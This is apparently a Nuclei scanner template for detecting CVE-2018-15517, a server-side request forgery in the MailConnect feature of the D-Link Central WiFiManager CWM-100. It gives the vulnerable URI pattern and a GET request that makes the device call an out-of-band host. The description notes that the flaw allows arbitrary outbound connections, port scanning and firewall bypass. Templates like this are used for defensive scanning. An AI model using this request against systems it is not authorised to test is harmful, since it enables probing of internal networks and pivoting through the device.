id: CVE-2018-15517
info:
  author: gy741
  classification:
    cve-id: CVE-2018-15517
    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:N/I:H/A:N
    cvss-score: 8.6
    cwe-id: CWE-918
  description: D-Link Central WifiManager is susceptible to server-side request forgery.
    The MailConnect feature on D-Link Central WiFiManager CWM-100 1.03 r0098 devices
    is intended to check a connection to an SMTP server but actually allows outbound
    TCP to any port on any IP address, as demonstrated by an index.php/System/MailConnect/host/127.0.0.1/port/22/secure/
    URI. This can undermine accountability of where scan or connections actually came
    from and or bypass the FW etc. This can be automated via script or using a browser.
  name: D-Link Central WifiManager - Server-Side Request Forgery
  reference:
  - http://hyp3rlinx.altervista.org/advisories/DLINK-CENTRAL-WIFI-MANAGER-CWM-100-SERVER-SIDE-REQUEST-FORGERY.txt
  - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-15517
  - http://seclists.org/fulldisclosure/2018/Nov/28
  - http://packetstormsecurity.com/files/150243/D-LINK-Central-WifiManager-CWM-100-1.03-r0098-Server-Side-Request-Forgery.html
  severity: high
  tags: cve,cve2018,dlink,ssrf,oast
requests:
- matchers:
  - part: interactsh_protocol
    type: word
    words:
    - http
  method: GET
  path:
  - '{{BaseURL}}/index.php/System/MailConnect/host/{{interactsh-url}}/port/80/secure/'
